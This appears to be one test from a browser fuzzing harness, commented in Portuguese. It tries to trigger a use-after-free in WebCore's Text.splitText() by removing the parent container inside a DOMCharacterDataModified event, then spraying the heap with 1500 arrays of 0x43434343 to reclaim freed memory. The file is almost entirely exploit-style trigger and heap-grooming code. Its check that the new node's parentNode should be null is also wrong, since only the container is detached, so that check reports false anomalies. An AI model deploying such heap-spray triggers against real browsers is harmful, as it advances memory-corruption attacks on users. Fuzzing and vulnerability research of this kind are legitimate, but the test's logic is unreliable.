'use strict';
/**
 * Teste 10 — WebCore: TextNode mutation and splitText UAF
 *
 * Foco: splitText() modifica dados de caracteres (disparando eventos sync)
 * e DEPOIS retorna um novo TextNode. Destruir o pai do TextNode dentro
 * do evento deixa a função do C++ sem base para terminar a operação.
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests['10'] = {
    id      : 10,
    name    : 'WebCore.Text — splitText and DOMCharacterDataModified',
    category: 'WebCore-TextNode-UAF',
    timeout : 5000,

    run: function () {
      var anomalies = [];
      var sandbox = document.createElement('div');
      sandbox.id = 'fuzzer-sandbox-10';
      document.body.appendChild(sandbox);

      (function variantA() {
        try {
          var container = document.createElement('div');
          var textNode = document.createTextNode('AAAAAAAAAABBBBBBBBBB');
          container.appendChild(textNode);
          sandbox.appendChild(container);

          var fired = false;

          /* Hook síncrono disparado quando o texto original é cortado */
          container.addEventListener('DOMCharacterDataModified', function(e) {
            if (fired) return;
            fired = true;

            /* Destrói a árvore principal. O C++ ainda não retornou
             * o novo TextNode criado por splitText(). */
            sandbox.removeChild(container);

            /* Pressure the heap no tamanho aproximado de TextNodes/RenderText */
            var spray = [];
            for (var i = 0; i < 1500; i++) {
              /* 0x43434343 = C C C C */
              spray.push(new Uint32Array(64).fill(0x43434343));
            }
          });

          /* Divide no índice 10. O C++ faz:
           * 1. Atualiza oldNode para 'AAAAAAAAAA' (dispara o evento acima)
           * 2. Cria newNode 'BBBBBBBBBB'
           * 3. Anexa newNode após oldNode
           * 4. Retorna newNode para o JS
           */
          var novoNo = textNode.splitText(10);

          /* Se não crashar via memory corruption no C++, avaliamos o zumbi retornado */
          if (novoNo) {
             if (novoNo.parentNode !== null) {
               /* O pai deveria ser null pois deletamos o container no callback */
               anomalies.push('A: TextNode retornado possui um parentNode fantasma');
             }
             if (typeof novoNo.data !== 'string') {
               anomalies.push('A: TextNode retornado sofreu Type Confusion na propriedade data');
             }
          }

        } catch (e) {
          anomalies.push('A: ' + String(e));
        }
      }());

      document.body.removeChild(sandbox);

      if (anomalies.length > 0) return { status: 'ANOMALY', detail: anomalies.join(' | ') };
      return { status: 'PASS', detail: 'splitText() controlou o teardown com segurança' };
    }
  };

}(window));
